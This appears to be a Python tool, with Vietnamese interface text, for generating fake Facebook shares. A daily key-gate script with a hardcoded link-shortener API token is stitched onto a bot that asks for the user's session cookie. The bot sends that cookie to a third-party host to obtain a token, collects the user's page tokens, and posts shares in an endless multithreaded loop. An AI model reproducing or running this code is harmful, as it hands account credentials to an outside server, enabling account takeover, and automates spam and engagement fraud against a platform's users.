import requests
import json
from colorama import Fore, Style
from datetime import datetime, timedelta
from pytz import timezone
import requests
import time
import json
import sys
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading
from threading import BoundedSemaphore

print("""\033[1;32m

╔══╦╗╔╦══╦═╦═╦══╦═╗
║══╣╚╝║╔╗║╬║╦╣╔╗║║║
╠══║╔╗║╠╣║╗╣╩╣╠╣║║║
╚══╩╝╚╩╝╚╩╩╩═╩╝╚╩═╝

TELEGRAM: @dichcutelegram
TOOL SHARE AO BY KHANGLEE

\033[0m""")


SHAREAO_FILE = "shareao.json"
VN_TIMEZONE = timezone('Asia/Ho_Chi_Minh')

def get_today_key():
    today = datetime.now(VN_TIMEZONE).date()
    day_number = today.day
    key = str(day_number * 25937 + 469173)
    return key

def get_shortened_link(key):
    api_key = "cb879a865cf502e831232d53bdf03813caf549906e1d7556580a79b6d422a9f7" 
    base_url = "https://yeumoney.com/QL_api.php"
    url_to_shorten = f'https://cc.lequockhang.site/key/shareao.php?key={key}'
    params = {
        "token": api_key,
        "format": "json",
        "url": url_to_shorten
    }

    try:
        response = requests.get(base_url, params=params)
        response.raise_for_status() 
        data = response.json()
        if data["status"] == "error":
            raise ValueError(data["message"])
        else:
            return data["shortenedUrl"]
    except (requests.exceptions.RequestException, ValueError, KeyError) as e:
        print(f"Lỗi khi lấy link rút gọn: {e}")
        return None

def is_key_valid():
    try:
        with open(SHAREAO_FILE, "r") as f:
            shareao = json.load(f)
            saved_key = shareao.get("key")
            expiration_time_str = shareao.get("expiration_time")

            if saved_key != get_today_key():
                return False

            expiration_time = datetime.fromisoformat(expiration_time_str).astimezone(VN_TIMEZONE)
            return datetime.now(VN_TIMEZONE) <= expiration_time  # So sánh thời gian hiện tại với thời gian hết hạn
    except (FileNotFoundError, json.JSONDecodeError, ValueError):
        return False

def save_shareao(key):
    expiration_time = datetime.now(VN_TIMEZONE) + timedelta(hours=24) 
    with open(SHAREAO_FILE, "w") as f:
        json.dump({
            "key": key,
            "expiration_time": expiration_time.isoformat()
        }, f)

def main():
    if is_key_valid():
        print("\033[1;32mKey hợp lệ. Chào mừng bạn trở lại!\033[0m")
        # ... (Phần hiển thị giao diện và các chức năng khác của bạn ở đây) ...
    else:
        key = get_today_key()
        link_key = get_shortened_link(key)

        if link_key:
            print(f"\033[1;32mLink lấy key: \033[1;33m{link_key}\033[0m")
            while True:
                nhap_key = input("\033[1;32mKeyTool Hôm Nay: \033[1;33m")
                if nhap_key == key:
                    save_shareao(key)
                    print("\033[1;32mKey chính xác. Chúc bạn ngày tốt lành!\033[0m")
                    break  # Thoát khỏi vòng lặp khi nhập đúng key
                else:
                    print("\033[1;31mKey sai. Vui lòng nhập lại hoặc lấy key từ link.\033[0m")
        else:
            print("\033[1;31mKhông thể tạo link rút gọn. Vui lòng thử lại sau.\033[0m")

if __name__ == "__main__":
	main()
	
import requests, random, threading, os, time, re
from datetime import datetime
now = datetime.now()
dt_string = now.strftime("%m/%d/%Y %H:%M:%S")
trang = "\033[1;37m"
luc = "\033[0;32m"
cam = "\033[1;34m"
do = "\033[1;31m"
vang = "\033[1;33m"
tim = "\033[1;35m"
xnhac = "\033[1;36m"
list_token = []
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f'''
       \033[1;33mTOOL SHARE ẢO PRO5 MAX SPEED BY KHANGLEE
\033[1;35m
╔╦╦╗╔╦══╦═╦╦══╦╗╔═╦═╗
║╔╣╚╝║╔╗║║║║╔═╣║║╦╣╦╝
║╚╣╔╗║╠╣║║║║╚╗║╚╣╩╣╩╗
╚╩╩╝╚╩╝╚╩╩═╩══╩═╩═╩═╝
============================================

    ''')

class Api_Facebook:
    def GetThongTinFacebook(self, cookie: str):
        headers_get = {'authority': 'www.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','viewport-width': '1184','cookie': cookie}
        try:
            url_profile = requests.get('https://www.facebook.com/me', headers = headers_get).url
            get_dulieu_profile = requests.get(url = url_profile, headers = headers_get).text
        except:
            return {'status': 'error', 'message':'Get Dữ Liệu Thất Bại Vui Lòng Kiểm Tra Lại!!'}
        try:
            uid_get = cookie.split('c_user=')[1].split(';')[0]
            name_get = get_dulieu_profile.split('<h1 class="x1heor9g x1qlqyl8 x1pd3egz x1a2a7pz">')[1].split('</h1>')[0]
            fb_dtsg_get = get_dulieu_profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
            jazoest_get = get_dulieu_profile.split('{"name":"jazoest","value":"')[1].split('"},')[0]
            lsd = get_dulieu_profile.split('["LSD",[],{"token":"')[1].split('"},')[0]
            return {'status':'success', 'name': name_get, 'id': uid_get, 'fb_dtsg': fb_dtsg_get, 'jazoest': jazoest_get, 'lsd': lsd}
        except:
            try:
                uid_get = cookie.split('c_user=')[1].split(';')[0]
                name_get = get_dulieu_profile.split('<h1 class="x1heor9g x1qlqyl8 x1pd3egz x1a2a7pz">')[1].split('</h1>')[0]
                fb_dtsg_get = get_dulieu_profile.split(',"f":"')[1].split('","l":null}')[0]
                jazoest_get = get_dulieu_profile.split('&jazoest=')[1].split('","e":"')[0]
                lsd = get_dulieu_profile.split('["LSD",[],{"token":"')[1].split('"},')[0]
                return {'status':'success', 'name': name_get, 'id': uid_get, 'fb_dtsg': fb_dtsg_get, 'jazoest': jazoest_get, 'lsd': lsd}
            except:
                return {'status': 'error', 'message':'Get Dữ Liệu Thất Bại Vui Lòng Kiểm Tra Lại!!'}
    def getpage(self, token):
        try:
            json_get = requests.get('https://graph.facebook.com/me/accounts?access_token='+token).json()['data']
            if len(json_get) != 0:
                return json_get
            else: 
                return False
        except:
            return False
    def run_share(self, tokenpage, id_post):
        rq_url = random.choice([requests.get, requests.post])
        sharepost = rq_url(f'https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/{id_post}&published=0&access_token={tokenpage}').json()
        print(f'{sharepost} SUCCESS')

banner()
yumi = Api_Facebook()
cookie = input(f'{vang}NHẬP COOKIE CHỨA PAGE: ')
json_info = requests.get(f'http://keytoolhoangfree.x10.mx/api/16token.php?cookie={cookie}&type=05').json()
token = json_info['access_token']
Check_Live_Account = Api_Facebook().GetThongTinFacebook(cookie)
if Check_Live_Account['status'] != 'error':
    namecu = Check_Live_Account['name']
    name = re.sub(r'<.*?>', '', namecu)
    uid = Check_Live_Account['id']
    print(f'NAME FB: {name} | UID FB: {uid}')
link=input(f'{luc}NHẬP LINK BÀI VIẾT: ')
time.sleep(2)
data = {
          'link':link
     }
headers={
        'Authority':'id.traodoisub.com',
        'Accept':'application/json, text/javascript, /; q=0.01',
        'Accept-Language':'vi,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin':'https://id.traodoisub.com',
        'Referer':'https://id.traodoisub.com/',
        'Sec-Ch-Ua':'"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37',
        'X-Requested-With':'XMLHttpRequest',
    }
get = requests.post('https://id.traodoisub.com/api.php',data=data ,headers=headers).json()
id_post = get['id']
print(f'─'*50)
print(f'{do}UID BÀI VIẾT CỦA BẠN LÀ: {id_post}')
print(f'─'*50)
luong = int(input(f'{xnhac}VUI LÒNG NHẬP SỐ LUỒNG SHARE: '))
print(f'─'*50)
getpage = yumi.getpage(token)
if getpage != False:
    print(f'{cam}ĐÃ TÌM THẤY {len(getpage)} PAGE PROFILE')
    print(f'─'*50)
    for getdl in getpage:
        tokenpagegett = getdl['access_token']
        list_token.append(tokenpagegett)
else:
    print(f'{do}KHÔNG TÌM THẤY PAGE PROFILE NÀO!!!')
while True:
    for tokenpage in list_token:
        t = threading.Thread(target=yumi.run_share,args=(tokenpage, id_post))
        t.start()
        while threading.active_count() > luong:
            t.join()